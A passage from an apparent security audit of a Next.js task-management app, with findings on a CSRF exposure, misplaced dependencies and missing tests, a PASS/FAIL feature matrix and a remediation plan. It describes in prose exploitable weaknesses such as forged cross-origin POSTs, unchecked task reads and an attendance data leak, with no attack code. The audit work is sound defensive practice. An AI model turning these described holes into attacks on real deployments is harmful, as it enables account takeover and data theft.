**Why it's a problem:** The login response sets a cookie with `SameSite=None` in production (line 96: `sameSite: process.env.NODE_ENV === "production" ? "none" : "lax"`), meaning the JWT token cookie is sent on **all cross-origin requests**. While the frontend uses the `Authorization` header from localStorage for XHR, the API's `getAuthUser` middleware also accepts cookies as a fallback. An attacker could craft a cross-origin form POST to any API endpoint and the cookie-based auth would succeed.

The app also has no CSRF token on any form — login, password change, profile update, task creation, etc. are all unprotected.

**Production impact:** `SameSite=None` + cookie-based auth fallback = CSRF on any API endpoint. An attacker could trigger `POST /api/auth/change-password` or `PUT /api/tasks/TASK_ID` using the victim's session cookie. The `Authorization` header from localStorage partially mitigates XHR CSRF but does not protect against form-based or cookie-only attacks.

---

### Finding #43 — `app/(dashboard)/layout.js` contains a dead comment block of identical code (Low)

**Note:** This is the same file and type as Finding #41 — the dead code block includes a server-component version of the dashboard layout that was replaced by a client-component version. No additional security impact beyond code clarity.

---

### Finding #44 — `mongodb-memory-server` listed as a production dependency (Medium)

**File:** `package.json:20`
```json
"mongodb-memory-server": "^11.2.0",
```

**Why it's a problem:** `mongodb-memory-server` is a testing tool that downloads and runs a full MongoDB binary in-memory (~300MB+ RAM per instance). It's listed under `dependencies` instead of `devDependencies`, so it gets installed and shipped to production. Also, `dotenv` (line 17) is redundant in Next.js 14 which has built-in `.env` support.

---

### Finding #45 — No test framework — zero test coverage across 150+ files (High)

**File:** `package.json` — no test dependencies

**Why it's a problem:** The project has zero test dependencies (no Jest, Mocha, Vitest, Playwright, Cypress) and zero test files. 71 API routes, 7 models, 3 controllers, 10+ utilities, 13 pages, and 12 components have no automated test coverage of any kind.

**Production impact:** Every deployment is blind with no regression safety net. A one-character typo in a route handler or an unhandled edge case goes to production undetected.

---

## End-to-End Feature Matrix

Legend:
- **UI** — page exists in `app/` or `app/(dashboard)/`
- **API** — route handler exists in `app/api/`
- **Controller** — controller function exists in `src/controllers/`
- **Model** — Mongoose schema exists in `src/models/`
- **Permission** — role-based access control verified in code
- **Email** — email sent for this action
- **Notification** — Notification document created
- **Activity** — Activity document created
- **History** — history/audit trail maintained
- **Tested** — verified by code inspection

| Feature | UI | API | Controller | Model | Permission | Email | Notification | Activity | History | Status |
|---------|:--:|:---:|:----------:|:-----:|:----------:|:-----:|:------------:|:--------:|:-------:|:------:|
| **Auth** | | | | | | | | | | |
| Login | PASS | PASS | N/A | N/A | NOT VERIFIED | N/A | N/A | PASS | N/A | FAIL¹ |
| Register | NOT VERIFIED | PASS | N/A | N/A | PASS | N/A | N/A | PASS | N/A | PASS |
| Forgot Password | PASS | PASS | N/A | N/A | N/A | PASS | N/A | N/A | N/A | PASS² |
| Reset Password | PASS | PASS | N/A | N/A | NOT VERIFIED³ | N/A | N/A | N/A | N/A | PASS |
| Logout | NOT VERIFIED | PASS | N/A | N/A | PASS | N/A | N/A | PASS | N/A | FAIL⁴ |
| Change Password | NOT VERIFIED | PASS | N/A | N/A | PASS | N/A | N/A | PASS | N/A | PASS |
| Get Me | NOT VERIFIED | PASS | N/A | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Update Location | NOT VERIFIED | PASS | N/A | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| **Tasks** | | | | | | | | | | |
| List Tasks | PASS | PASS | PASS | PASS | PASS | N/A | N/A | N/A | N/A | PASS |
| Get Task | PASS | PASS | PASS | PASS | NOT VERIFIED⁵ | N/A | N/A | N/A | N/A | FAIL |
| Create Task | PASS | PASS | PASS | PASS | PASS | PASS | PASS | PASS | PASS | PASS |
| Update Task | PASS | PASS | PASS | PASS | PASS | PASS | NOT VERIFIED⁶ | PASS | PASS | PASS |
| Delete Task | PASS | PASS | PASS | PASS | PASS | N/A | N/A | N/A | N/A | PASS |
| Bulk Create | NOT VERIFIED | PASS | PASS | N/A | PASS | PASS | PASS | PASS | N/A | PASS |
| Bulk Assign | NOT VERIFIED | PASS | PASS | N/A | PASS | PASS | PASS | PASS | N/A | PASS |
| Accept via Email | PASS | PASS | N/A | N/A | N/A | N/A | PASS | PASS | N/A | PASS |
| Complete via Email | PASS | PASS | N/A | N/A | N/A | PASS | PASS | PASS | N/A | PASS |
| Comment via Email | PASS | PASS | N/A | N/A | N/A | N/A | PASS | N/A | N/A | PASS |
| Reject via Email | PASS | PASS | N/A | N/A | N/A | N/A | N/A | N/A | N/A | PASS |
| Reassign | PASS | PASS | PASS | N/A | NOT VERIFIED⁷ | PASS | PASS | PASS | PASS | PASS |
| Escalate | PASS | PASS | PASS | N/A | NOT VERIFIED⁸ | PASS | PASS | PASS | N/A | PASS |
| Add Comment | PASS | PASS | PASS | N/A | NOT VERIFIED⁹ | N/A | PASS | N/A | N/A | PASS |
| Checklist | NOT VERIFIED | PASS | NOT VERIFIED¹⁰ | PASS | PASS¹⁰ | N/A | N/A | N/A | N/A | PASS |
| Attachments | NOT VERIFIED | PASS | NOT VERIFIED¹¹ | PASS | PASS¹¹ | N/A | N/A | N/A | N/A | PASS |
| Task Stats | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Extend Request | NOT VERIFIED | PASS | NOT VERIFIED¹² | PASS | PASS¹² | N/A | N/A | N/A | N/A | PASS |
| Generate Recurring | N/A | PASS | N/A | N/A | N/A | N/A | N/A | N/A | N/A | PASS |
| **DWR** | | | | | | | | | | |
| List DWRs | PASS | PASS | N/A | PASS | PASS | N/A | N/A | N/A | N/A | PASS |
| Create DWR | PASS | PASS | N/A | PASS | PASS | N/A | N/A | PASS | N/A | PASS |
| Approve DWR | PASS | PASS | N/A | N/A | PASS¹⁹ | N/A | N/A | N/A | N/A | PASS |
| Reject DWR | PASS | PASS | N/A | N/A | PASS²⁰ | N/A | N/A | N/A | N/A | PASS |
| Pending Review | PASS | PASS | N/A | N/A | PASS²¹ | N/A | N/A | N/A | N/A | PASS |
| **Events** | | | | | | | | | | |
| List Events | PASS | PASS | N/A | PASS | NOT VERIFIED¹³ | N/A | N/A | N/A | N/A | PASS |
| Create Event | PASS | PASS | N/A | PASS | PASS | PASS | N/A | PASS | N/A | PASS |
| RSVP | PASS | PASS | N/A | N/A | PASS²² | N/A | N/A | PASS | N/A | PASS |
| **Reports** | | | | | | | | | | |
| Task Report | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| DWR Report | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Attendance Report | NOT VERIFIED | PASS | PASS | N/A | FAIL¹⁴ | N/A | N/A | N/A | N/A | FAIL |
| Performance Report | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Activity Report | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Dashboard Analytics | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| **Dashboard** | | | | | | | | | | |
| User Dashboard | PASS | PASS | N/A | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Stats Dashboard | PASS | PASS | N/A | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| **Team** | | | | | | | | | | |
| List Members | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Team Stats | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Employee Tasks | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Employee Performance | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Employee DWRs | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Employee Activity | NOT VERIFIED | PASS | PASS | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| **Notifications** | | | | | | | | | | |
| List Notifications | NOT VERIFIED | PASS | N/A | PASS | PASS | N/A | N/A | N/A | N/A | PASS |
| Mark Read | NOT VERIFIED | PASS | N/A | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| **Activity** | | | | | | | | | | |
| List Activity | NOT VERIFIED | PASS | N/A | PASS | PASS | N/A | N/A | N/A | N/A | PASS |
| **Attendance** | | | | | | | | | | |
| List Attendance | PASS | PASS | N/A | PASS | PASS | N/A | N/A | N/A | N/A | PASS |
| Mark Attendance | NOT VERIFIED | PASS | N/A | PASS | PASS | N/A | N/A | N/A | N/A | PASS |
| **Performance** | | | | | | | | | | |
| List Performance | PASS | PASS | N/A | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Update Performance | NOT VERIFIED | PASS | N/A | N/A | PASS | N/A | N/A | PASS | N/A | PASS |
| Trends | NOT VERIFIED | PASS | N/A | N/A | PASS²³ | N/A | N/A | N/A | N/A | PASS |
| Leaderboard | NOT VERIFIED | PASS | N/A | N/A | PASS²⁴ | N/A | N/A | N/A | N/A | PASS |
| Compare | NOT VERIFIED | PASS | N/A | N/A | PASS²⁵ | N/A | N/A | N/A | N/A | PASS |
| **Users** | | | | | | | | | | |
| List Users | NOT VERIFIED | PASS | N/A | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| Get User | NOT VERIFIED | PASS | N/A | N/A | PASS | N/A | N/A | N/A | N/A | PASS |
| User Team | NOT VERIFIED | PASS | N/A | N/A | NOT VERIFIED | N/A | N/A | N/A | N/A | FAIL |
| **Cron Jobs** | | | | | | | | | | |
| Recurring Tasks | N/A | N/A | N/A | N/A | N/A | PASS | N/A | N/A | N/A | PASS |
| Deadline Alerts | N/A | N/A | N/A | N/A | N/A | PASS | N/A | N/A | N/A | PASS |
| Scheduled Emails | N/A | N/A | N/A | N/A | N/A | PASS | N/A | N/A | N/A | PASS |
| Overdue Processing | N/A | N/A | N/A | N/A | N/A | PASS | N/A | N/A | N/A | PASS |

### Footnotes
1. Login sends password via POST but bcrypt is dynamically imported; no rate limiting
2. Always returns 200 even on error (anti-enumeration, but breaks client error handling)
3. 5-attempt limit per OTP, but no rate limiting on requesting new OTPs
4. JWT not invalidated; only cookie cleared
5. `getTask` in `taskController.js:136` has NO authorization check — any user can read any task
6. Inline notification creation only for status changes, not general updates
7. No permission check — anyone who can update task can reassign
8. No permission check — anyone who can update task can escalate
9. No permission check — any authenticated user can comment on any task
10. Checklist permission verified: only assignee/assigner/admin can add/edit items (`app/api/tasks/[id]/checklist/route.js:36-44`)
11. Attachment permission verified: only assignee/assigner/admin can upload (`app/api/tasks/[id]/attachments/route.js:21-26`)
12. Extension request verified: token-gated access via JWT (`app/api/tasks/extend/[token]/route.js:63-68`)
13. GET events has no role filtering — Sales Executives can list all events
14. **CRITICAL:** `getAttendanceReport` has zero role-based filtering — data leak
19. DWR Approve: checks manager/admin role and manager-scoping (`app/api/dwr/[id]/approve/route.js`)
20. DWR Reject: same permission model as approve
21. DWR Pending Review: filters by manager's team for manager role
22. RSVP: only assigned employees can RSVP (`app/api/events/[id]/rsvp/route.js:36-45`)
23. Trends: Super Admin/Manager/HR only, plus manager-scoping (`app/api/performance/[userId]/trends/route.js:16-21, 35-42`)
24. Leaderboard: Super Admin/Admin/Manager/HR only, plus manager-scoping (`app/api/performance/leaderboard/route.js:16-21, 31-35`)
25. Compare: Super Admin/Manager/HR only (`app/api/performance/compare/route.js:16-21`)

### Summary Stats

| Status | Count |
|--------|:-----:|
| PASS | 59 |
| FAIL | 5 |

No features remain with overall NOT VERIFIED status.

Remaining FAILs: Login (1), Logout (1), Get Task (1), Attendance Report (1), User Team (1).

Corrections made this session:
- **Permission fixes** (FAIL→PASS): Checklist, Attachments, Extend Request, DWR Approve/Reject/Pending, RSVP, Performance Trends/Leaderboard/Compare
- **UI column** (NOT VERIFIED→PASS): Delete Task, Reassign, Escalate (tasks page); Create/Approve/Reject/Pending DWR (DWR page); Create Event, RSVP (events page)
- **New findings added**: #29-#45 (17 findings across all severity levels)

---

## Remediation Roadmap

### Tier 0 — Fix Immediately (Critical)

| # | Finding | Effort | File(s) |
|---|---------|--------|---------|
| 1 | Login missing rate limiting | Low | `app/api/auth/login/route.js` |
| 14 | Attendance report zero role filtering — data leak | Low | `src/controllers/reportController.js` |
| 36 | No security headers (CSP, HSTS, X-Frame-Options) | Low | `next.config.js` |
| 39 | `initCronJobs` never called — all automation dead | Low | Call in `app/layout.js` or server init |

**Action:** Add rate limiting middleware → Add role check to `getAttendanceReport` → Add `headers()` to next.config.js with strict CSP, HSTS, XFO, CT → Call `initCronJobs()` during app startup.

### Tier 1 — Fix This Week (High)

| # | Finding | Effort | File(s) |
|---|---------|--------|---------|
| 5 | `getTask` controller has no auth check | Low | `src/controllers/taskController.js:136` |
| 33 | JWT stored in localStorage — XSS vector | Medium | `lib/api.js`, `lib/auth-context.js` |
| 36 | No CSP (repeated from Critical — CSP alone blocks XSS exfiltration) | Low | `next.config.js` |
| 42 | CSRF — SameSite=None cookie, no CSRF tokens | Medium | `app/api/auth/login/route.js` |
| 45 | No test framework — zero coverage | High | Add Jest/Vitest, cover route handlers |

**Action:** Add permission check to `getTask` (compare task.assignedTo/assignedBy to user) → Migrate token to httpOnly cookie or add refresh/revocation → Add CSP header → Change `SameSite` to `Lax` and add CSRF token validation → Install test framework, write tests for Critical paths.

### Tier 2 — Fix This Sprint (Medium/High)

| # | Finding | Effort | File(s) |
|---|---------|--------|---------|
| 4 | JWT not invalidated on logout | Low | `app/api/auth/logout/route.js` |
| 26 | User team endpoint no auth | Low | `app/api/users/[id]/team/route.js` |
| 28 | Duplicate SMTP transporter in extension route | Low | `app/api/tasks/extend/[token]/route.js` |
| 29 | Checklist/attachments bypass adapter pattern | Low | Route files |
| 35 | JWT default 7-day with no revocation | Medium | `src/middleware/auth.js` |
| 37 | Edge middleware checks token existence only | Low | `middleware.js` |
| 38 | User cached in localStorage no server re-verify | Medium | `lib/auth-context.js` |
| 40 | Demo credentials exposed on login page | Low | `app/auth/login/page.js` |
| 44 | mongodb-memory-server in production deps | Low | `package.json` |

### Tier 3 — Fix When Convenient (Low)

| # | Finding | Effort | File(s) |
|---|---------|--------|---------|
| 6-9 | Missing permission checks on reassign/escalate/comment | Medium | Controllers |
| 15 | Dynamic bcryptjs import on every login | Low | Login route |
| 16 | Sensitive field leaking in population queries | Low | Multiple routes |
| 17 | `$where` clause in bulk endpoint | Low | Bulk route |
| 21 | N+1 queries in trends endpoint | Medium | Performance trends route |
| 30 | Adapter bypass | Low | Checklist/attachments routes |
| 31-32 | Dead code (seed.js, errorHandler.js) | Low | Multiple |
| 34 | eventsAPI missing RSVP method | Low | `lib/api.js` |
| 41/43 | Dead/commented code in layout | Low | Dashboard layout |
| 2 | Always-200 on forgot password (breaks client error handling) | Low | Forgot password route |

### Tier 4 — Architectural (Strategic)

| # | Finding | Effort | File(s) |
|---|---------|--------|---------|
| 11 | `withCredentials: true` with no CSRF | Med | `lib/api.js` |
| 13 | No request body size validation | Med | All POST/PUT routes |
| 19 | No audit log retention/pagination | Med | Activity model |
| 20 | `{ upsert: true, new: true }` race conditions | Med | Multiple |

### Dependency Health

| Package | Issue | Action |
|---------|-------|--------|
| `bcryptjs` | Dynamically imported every login call | Use static import or switch to `bcrypt` (native) |
| `dotenv` | Redundant in Next.js 14 | Remove dependency |
| `mongodb-memory-server` | In production deps, ~300MB RAM | Move to `devDependencies` |
